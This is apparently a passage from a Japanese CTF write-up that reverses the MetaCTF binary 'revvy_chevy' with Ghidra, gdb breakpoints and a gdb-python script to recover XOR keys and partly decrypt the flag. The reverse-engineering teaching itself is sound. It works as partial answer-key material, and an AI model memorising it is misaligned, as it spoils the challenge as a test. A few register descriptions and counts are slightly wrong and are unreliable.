&lt;td align=&quot;center&quot;&gt;RBX&lt;br /&gt;（ベースレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主にデータへのポインタが格納される汎用レジスタです&lt;br /&gt;下位32bitをEBXレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RCX&lt;br /&gt;（カウンタレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主に文字列やループカウンタが格納される汎用レジスタです&lt;br /&gt;下位32bitをECXレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RDX&lt;br /&gt;（データレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主にI/Oポインタの計算時に変数として利用されます&lt;br /&gt;下位32bitをEDXレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RSI&lt;br /&gt;（ソースインデックス）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主に文字列のコピー先などに使用されます&lt;br /&gt;下位32bitをESIレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RDI&lt;br /&gt;（ディスティネーションインデックス）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主に文字列操作時の宛先指定に使用されます&lt;br /&gt;下位32bitをEDIレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RSP&lt;br /&gt;（スタックポインタレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;スタックポインタとして使用されます&lt;br /&gt;下位32bitをESPレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RBP&lt;br /&gt;（ベースポインタレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;スタック上のデータへのポインタとして使用されます&lt;br /&gt;下位32bitをEBPレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RIP&lt;br /&gt;（インストラクションレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;命令セットが格納されます&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RFLAGS&lt;br /&gt;（フラグレジスタ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;下位32bitがEFRAGSと同様にフラグレジスタとして使用されます&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3lkunSs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Debug Hacks -デバッグを極めるテクニック&amp;#x26;ツール&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3o7g5Gj&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解セキュリティコンテスト&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;各レジスタやアーキテクチャの詳細についてはここでは割愛しますが、関数実行後の戻り値はRAXレジスタに格納されるため、CALL命令の直後のRAXレジスタを参照することが、関数の結果を取得する際の基本方針になります。&lt;/p&gt;
&lt;h3 id=&quot;関数の戻り値を特定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%96%A2%E6%95%B0%E3%81%AE%E6%88%BB%E3%82%8A%E5%80%A4%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;関数の戻り値を特定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;関数の戻り値を特定する&lt;/h3&gt;
&lt;p&gt;Ghidraの結果から、キーを生成している関数を呼び出しているアドレスは、&lt;code class=&quot;language-text&quot;&gt;0x5555555552b3&lt;/code&gt;であることがわかります。&lt;/p&gt;
&lt;p&gt;つまり、その次の命令である&lt;code class=&quot;language-text&quot;&gt;0x5555555552b8&lt;/code&gt;時点のRAXレジスタに格納されている値が、この関数の戻り値であるということがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/95f8a3a684ff495a86e22079911cfeda/2bef9/image-49-1024x657.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 64.16666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACoklEQVQ4y02TWW8TZxiF86t7hxICtCUIqf+lqrhBQhVSJVoSYgczjh2H2I6X8ezrt8w38/SdIQRGOtJc2GfO9h4ppQmCSLBjuVTsdqCUxbmGrEyoCkX/eNdznj8/I8rh9j7D6C1d2/H96bpv70dKKcIwJo5DtltNUYC1Dtc02CLD1dUj4emzM4xtieKYpMipTEqpE3SjH0mPeoXb7Z7JZMxikZGLgqLQaC3KfZ8wKIcfT4Xw+OkrGptxCNdCpLFOCVlN07ofhHWtOBx6dWtWq1qsQ1Vb+aOliiOyIKEVxdP5jSh8LVEkJNmSjh92f7Y9EPqHA6v1naAkToRQGWxjSNMAoyQDHGPP48Vvf2BNhh+siVKJp8rQtqSyhvZ7hlVVk4YZVVpSxB1WIitih8odbeMev764vuNELFvbkORSlhSnbW9b0DYDYY+B8Dy44J/wPX9vrzgvp5xXI0ZqxCT/wJfyIzfM+PP6DcenZ3SmI00UpWSta43TOVbLEh4SOFJi+XIz4s34L94vPC7DDVfpnBs945P/L9N8wh23vB2/45enJ1y3Hv9FH/kQeJxHEzwzFkz4rKd8Vl++zcbfBEyvJqwWtdiFMhG72klWEXXZPVhe8uT0d/IuYbFf4G1nrPI7dibiXrDRByIb9aVIs2EkZQQsV9K4tKxNP2xpWXxlkq2V7X0ajSVDsdxAFEneKqeV8Q9Wf8LQ8n7vc3s7Z72u5Er6HUrLxlCGPnWSPwx7xq8vzmhbyGTUqlFShpUiGuFxgnZgHErZ7Xzm8ylfvxYyFbFcGowQBvvgcdgXl96g0LmOuk5l+ApVyTWpUkTUKG3o3MNs+mHvdhvu7xWJ7LCWYTvZlsoiOb16IJx4M45PXiIXSZq11ELWSL5yKMjBSNsCWcD/JWXPeFf1UcgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/95f8a3a684ff495a86e22079911cfeda/8ac56/image-49-1024x657.webp 240w,
/static/95f8a3a684ff495a86e22079911cfeda/d3be9/image-49-1024x657.webp 480w,
/static/95f8a3a684ff495a86e22079911cfeda/e46b2/image-49-1024x657.webp 960w,
/static/95f8a3a684ff495a86e22079911cfeda/a9a89/image-49-1024x657.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/95f8a3a684ff495a86e22079911cfeda/8ff5a/image-49-1024x657.png 240w,
/static/95f8a3a684ff495a86e22079911cfeda/e85cb/image-49-1024x657.png 480w,
/static/95f8a3a684ff495a86e22079911cfeda/d9199/image-49-1024x657.png 960w,
/static/95f8a3a684ff495a86e22079911cfeda/2bef9/image-49-1024x657.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/95f8a3a684ff495a86e22079911cfeda/d9199/image-49-1024x657.png&quot;
            alt=&quot;2021/12/image-49-1024x657.png&quot;
            title=&quot;2021/12/image-49-1024x657.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0x5555555552b8&lt;/code&gt;では、キーを生成している関数の戻り値にさらにEBXの値を格納しています。&lt;/p&gt;
&lt;p&gt;これが最終的にXOR暗号を行うためのキーになります。&lt;/p&gt;
&lt;p&gt;ADD命令の演算結果は、関数の戻り値と同様にアキュムレータ（RAX）に格納されます。&lt;/p&gt;
&lt;p&gt;そこで、gdbで&lt;code class=&quot;language-text&quot;&gt;0x5555555552ba&lt;/code&gt;にブレークポイントを設定して実行してみましょう。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x5555555552ba
$ run&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;RAXレジスタの値が&lt;code class=&quot;language-text&quot;&gt;0x3039&lt;/code&gt;であることがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 882px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2be958fb5687e7e5eee58a87bf7d710d/90712/image-51.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 71.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACFElEQVQ4y31TWZLiMBTLYSALZN+8ZHEgDTQNNNX3P4xGNgUzUPR8qOLYid6T9OzVc4ftdoKUAlmWIU1TRFGE1Wr1hCh6Xttv3sErjYIZe6z54XKxQOD7CMMQvh8gCP4iDOyef1vz/Dd41UajGw1kb1AL7ZDnOYahQ99rh65TKMsC0zQ6JbYT+/PbDq1koQd0wxa6n6D6Deq6wn4/43T6JA44HvfQWuF6Pbn9JIn/I7kXKEjQ9gpi0Gi0gBAtRjPgdP4i2QGHzz19NpjnDTYb4wpaL9916RWDgB5H6MmQdECltAumkRqyG9ixQSMkSUo0Tf2Qeyd7JfXKUWKkT6bTyOIYCSsXRf7o4l0Qv8l9EBoGkNtxYZIxSdIsRcEQbPI23cgSBTcyS75gkaWdhiD8B4GDV207GPpjfYtpdpisUTHlkgVWKc3nexSvsc4S917kGfq2RVuWbs8hJfIEMZ9eSaJWS46EwcAgCvokG4bSseumcmeCa+ttXGSo6hqGa0XShCrSO6oSGeHlrHi9nh1+fr6hlcRiuWRAEinPxh1v0dQhrnKs2G3g3yT7v0m2Ui+XrwehImEYhejnETmTnS57SK5T3aCg33YqqkkhYQHn72sotsPz+ehILdq2ccZLys3oqVECvWhQ5ini9fPsvY6Ou3oZCT8+tu4G7HazGxd7IEWNjCabTmJQ9LkqkDAc9/ObObw//wB+7blQheitHAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2be958fb5687e7e5eee58a87bf7d710d/8ac56/image-51.webp 240w,
/static/2be958fb5687e7e5eee58a87bf7d710d/d3be9/image-51.webp 480w,
/static/2be958fb5687e7e5eee58a87bf7d710d/9d646/image-51.webp 882w&quot;
              sizes=&quot;(max-width: 882px) 100vw, 882px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2be958fb5687e7e5eee58a87bf7d710d/8ff5a/image-51.png 240w,
/static/2be958fb5687e7e5eee58a87bf7d710d/e85cb/image-51.png 480w,
/static/2be958fb5687e7e5eee58a87bf7d710d/90712/image-51.png 882w&quot;
            sizes=&quot;(max-width: 882px) 100vw, 882px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2be958fb5687e7e5eee58a87bf7d710d/90712/image-51.png&quot;
            alt=&quot;2021/12/image-51.png&quot;
            title=&quot;2021/12/image-51.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ちなみにレジスタの値は、&lt;code class=&quot;language-text&quot;&gt;p&lt;/code&gt;コマンドを使って取得することもできます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ p &lt;span class=&quot;token variable&quot;&gt;$rax&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; 0x3039&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;特に今回の場合、XORの暗号化を行った後のバイト列はchar型になるので、XOR暗号化に使用するキーもRAXレジスタの値の下位8bitのみになります。&lt;/p&gt;
&lt;p&gt;特定のレジスタの下位8bitの値のみを取り出したい場合は、&lt;code class=&quot;language-text&quot;&gt;$al&lt;/code&gt;レジスタの値を&lt;code class=&quot;language-text&quot;&gt;p&lt;/code&gt;コマンドで出力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ p &lt;span class=&quot;token variable&quot;&gt;$al&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; 0x39&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、1文字目の暗号化を行うキーは&lt;code class=&quot;language-text&quot;&gt;0x39&lt;/code&gt;であるということがわかります。&lt;/p&gt;
&lt;p&gt;このキーは1文字を暗号化するたびに生成されるので、&lt;code class=&quot;language-text&quot;&gt;c&lt;/code&gt;コマンドを使って実行を再開すると次は2文字目の暗号化を行うタイミングにブレークポイントが設定されます。&lt;/p&gt;
&lt;p&gt;この方法で、要領で4文字目までのキーを特定してみました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;文字目：0x39
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;文字目：0x7f
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;文字目：0xe1
&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;文字目：0x2f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このキーと、先ほどGhidraから特定した以下のバイト列を利用してFlagの4文字目まで復号できるかを試してみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; 0x74, 0x1a, 0x95, 0x4e, 0xba, 0xdb, 0x47, 0x64, 0x09, 0x2d, 0xd1, 0xbf, 0x8a, 0x9d, 0xde, 0x5a, 0xd7, 0x5c, 0x93, 0x16, 0x09, 0x3b, 0x30, 0x6f, 0x97, 0x40, 0xd0, 0x7c, 0x57, 0xdb, 0xde, 0x0c, 0x09, 0xa0, 0x84, 0x9b, 0x8a, 0x76, 0x2f, 0xb1, 0x57, 0xa2, 0xe1, 0x4f, 0xb9, 0x6f, 0x81, 0xbf, 0xb9, 0xbf, 0xe1, 0xef, 0x79, 0xcf, 0x01, 0xdf, 0xf9, 0x9f, 0xe1, 0x8f, 0x39, 0x2f, 0x81, 0xff, 0x00 &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際に4文字目まで復号してみると、出力が&lt;code class=&quot;language-text&quot;&gt;Meta&lt;/code&gt;となり、MetaCTFのフラグフォーマットに一致していることがわかりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;enc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x95&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x4e&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
key &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x39&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2f&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;enc&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;end&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; Meta&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これであとは、0x40文字分のキーを特定することができればFlagを特定できそうです。&lt;/p&gt;
&lt;p&gt;しかし、この手順を56回もやるのはかなり面倒くさいです。&lt;/p&gt;
&lt;p&gt;そこで、ここからはgdbの処理を自動化してFlagを一気に取得します。&lt;/p&gt;
&lt;h2 id=&quot;gdbを自動化する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdb%E3%82%92%E8%87%AA%E5%8B%95%E5%8C%96%E3%81%99%E3%82%8B&quot; aria-label=&quot;gdbを自動化する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gdbを自動化する&lt;/h2&gt;
&lt;p&gt;gdbは、&lt;code class=&quot;language-text&quot;&gt;.gdbinit&lt;/code&gt;や&lt;code class=&quot;language-text&quot;&gt;gdb-python&lt;/code&gt;を使って処理を自動化することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/10748501/what-are-the-best-ways-to-automate-a-gdb-debugging-session&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;scripting - What are the best ways to automate a GDB debugging session? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Python (Debugging with GDB)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.gdbinit&lt;/code&gt;の方が簡単にgdbのコマンド操作を自動化できますが、今回は取得した値を元に計算を行いたいので、より柔軟な処理を簡単に定義できる&lt;code class=&quot;language-text&quot;&gt;gdb-python&lt;/code&gt;を使用してきます。&lt;/p&gt;
&lt;h3 id=&quot;gdb-pythonを使う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdb-python%E3%82%92%E4%BD%BF%E3%81%86&quot; aria-label=&quot;gdb pythonを使う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gdb-pythonを使う&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;gdb-python&lt;/code&gt;を利用してデバッグを行う場合、以下のPythonスクリプトが基本形になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; gdb

BINDIR &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;~/Downloads&quot;&lt;/span&gt;
BIN &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;revvy_chevy&quot;&lt;/span&gt;
INPUT &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./in.txt&quot;&lt;/span&gt;
BREAK &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;0x5555555552ba&quot;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;INPUT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;file {}/{}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BINDIR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BIN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;b *{}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BREAK&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;run &amp;lt; {}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;INPUT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;quit&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;gdb.execute()&lt;/code&gt;が、Pythonスクリプトからgdbのコマンドを実行する関数です。&lt;/p&gt;
&lt;p&gt;基本はgdbをコマンド操作するときと同じですが、少々ややこしい点として実行中の入力値はファイルに事前定義しておく必要がある点です。&lt;/p&gt;
&lt;p&gt;今回のプログラムは標準入力からの入力を求められるため、実行前に&lt;code class=&quot;language-text&quot;&gt;./in.txt&lt;/code&gt;というファイルを作成して、0x40バイト分の文字列を予め書き込んでいます。&lt;/p&gt;
